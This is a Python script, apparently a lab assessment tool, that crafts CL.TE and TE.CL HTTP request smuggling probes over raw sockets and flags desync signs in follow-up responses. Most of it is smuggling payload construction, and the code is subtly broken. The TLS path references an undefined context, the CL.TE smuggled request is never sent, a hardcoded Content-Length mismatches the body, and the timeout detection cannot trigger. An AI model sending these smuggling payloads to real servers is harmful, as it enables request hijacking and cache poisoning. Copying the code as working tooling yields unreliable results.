#!/usr/bin/env python3
"""Detect CL.TE, TE.CL, and TE.TE desync candidates with raw sockets (lab use)."""

import argparse
import socket
import ssl
import time


def insecure_context():
  context = ssl.create_default_context()
  context.check_hostname = False
  context.verify_mode = ssl.CERT_NONE
  return context


def read_response(sock, timeout):
  sock.settimeout(timeout)
  data = b""
  try:
    while len(data) < 65536:
      chunk = sock.recv(4096)
      if not chunk:
        break
      data += chunk
      if b"\r\n\r\n" in data:
        header_end = data.index(b"\r\n\r\n") + 4
        status_line = data.split(b"\r\n", 1)[0]
        headers_blob = data[:header_end]
        content_length = 0
        for line in headers_blob.split(b"\r\n"):
          if line.lower().startswith(b"content-length:"):
            content_length = int(line.split(b":")[1].strip())
        if content_length and len(data) >= header_end + content_length:
          break
        if b"transfer-encoding: chunked" in headers_blob.lower():
          if data.rstrip().endswith(b"0\r\n\r\n"):
            break
  except socket.timeout:
    return None, data
  return status_line.decode("utf-8", "replace") if data else "", data


def send_raw(host, port, payload, timeout, use_ssl=False):
  try:
    with socket.create_connection((host, port), timeout=timeout) as sock:
      if use_ssl:
        sock = context.wrap_socket(sock, server_hostname=host)
      sock.sendall(payload.encode("latin-1"))
      start = time.monotonic()
      status_line, raw = read_response(sock, timeout)
      elapsed = time.monotonic() - start
      return status_line, raw, elapsed
  except OSError as exc:
    return f"ERR {exc}", b"", timeout


def baseline_probe(host, port, path, host_header, timeout, use_ssl):
  request = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host_header}\r\n"
    f"User-Agent: security-assessment-scripts/1.0\r\n"
    f"Connection: close\r\n"
    f"\r\n"
  )
  status_line, _, _ = send_raw(host, port, request, timeout, use_ssl)
  print(f"[*] baseline response: {status_line}")
  return status_line


def probe_cl_te(host, port, path, host_header, timeout, use_ssl):
  marker = "/smuggle-clte-probe"
  prefix = (
    f"POST {path} HTTP/1.1\r\n"
    f"Host: {host_header}\r\n"
    f"Content-Length: 38\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
  )
  smuggled = (
    f"GET {marker} HTTP/1.1\r\n"
    f"Host: {host_header}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
  )
  return prefix, smuggled, marker


def probe_te_cl(host, port, path, host_header, timeout, use_ssl):
  marker = "/smuggle-tecl-probe"
  body = f"0\r\n\r\nGET {marker} HTTP/1.1\r\nHost: h\r\nX: "
  prefix = (
    f"POST {path} HTTP/1.1\r\n"
    f"Host: {host_header}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"{body}"
  )
  return prefix, None, marker


def main():
  parser = argparse.ArgumentParser(description="Send differential smuggling probes to an authorized lab target.")
  parser.add_argument("target", help="lab host (optionally host:port)")
  parser.add_argument("--path", default="/", help="request path")
  parser.add_argument("--ssl", action="store_true", help="wrap the connection in TLS")
  parser.add_argument("--timeout", type=float, default=6.0, help="socket timeout in seconds")
  parser.add_argument("--technique", choices=["clte", "tecl"], default="clte", help="desync technique to test")
  args = parser.parse_args()

  if ":" in args.target:
    host, port = args.target.rsplit(":", 1)
    port = int(port)
  else:
    host, port = args.target, 443 if args.ssl else 80

  host_header = host
  baseline = baseline_probe(host, port, args.path, host_header, args.timeout, args.ssl)

  if args.technique == "clte":
    prefix, smuggled, marker = probe_cl_te(host, port, args.path, host_header, args.timeout, args.ssl)
  else:
    prefix, smuggled, marker = probe_te_cl(host, port, args.path, host_header, args.timeout, args.ssl)

  print(f"[*] sending {args.technique.upper()} prefix ({len(prefix)} bytes)...")
  status1, _, elapsed1 = send_raw(host, port, prefix, args.timeout, args.ssl)
  print(f"[*] first response after {elapsed1:.2f}s: {status1}")

  followup = (
    f"GET {args.path} HTTP/1.1\r\n"
    f"Host: {host_header}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
  )
  status2, raw2, elapsed2 = send_raw(host, port, followup, args.timeout, args.ssl)
  print(f"[*] second response after {elapsed2:.2f}s: {status2}")

  desync_signals = []
  if status2 and ("400" in status2 or "404" in status2 or "500" in status2):
    desync_signals.append(f"unexpected status on follow-up: {status2}")
  if status2 == "":
    desync_signals.append(f"empty/timeout response after {elapsed2:.2f}s (connection consumed)")
  if elapsed2 > args.timeout * 0.8:
    desync_signals.append("long delay suggests queued/blocked bytes")

  if desync_signals:
    print("\n[!] Possible desync indicators:")
    for signal in desync_signals:
      print(f"    - {signal}")
    print("Confirm manually with a controlled second request before reporting.")
  else:
    print("\nNo desync indicators from this technique.")


if __name__ == "__main__":
  main()
